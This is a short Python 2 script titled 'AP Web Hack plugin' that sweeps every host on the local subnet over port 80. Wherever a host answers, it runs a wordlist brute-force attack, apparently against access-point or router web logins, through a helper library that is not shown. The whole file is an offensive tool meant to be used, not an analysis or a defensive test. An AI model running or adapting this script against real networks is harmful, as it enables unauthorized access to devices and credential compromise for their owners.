#!/usr/bin/python
import webcracklib
import getopt
import sys

argv = sys.argv[1:]
opts,rest = getopt.getopt(argv,"b:e:i:n:s:r:v:")

try:
    interface = opts[0][1]
except:
    print "No interface specified! \nUsage : webcrack.py -i [interface]"
    sys.exit()


print "============ <AP Web Hack plugin> ==============\n"
crack = webcracklib.apwebcrack()
crack.getIpAddress(interface)
crack.getNetMask(interface)
hosts = crack.getHosts()
print "[*] Using "+crack.ip+" Netmask "+crack.netMask
for ip in hosts:
    crack.setHost(ip,80)
    print "[*] Trying "+ip
    if(crack.testConn()):
        print "[*] Connection Successfull"
        crack.loadWordList()
        crack.bruteHost()
print "============ <AP Web Hack Complete> ==============\n"





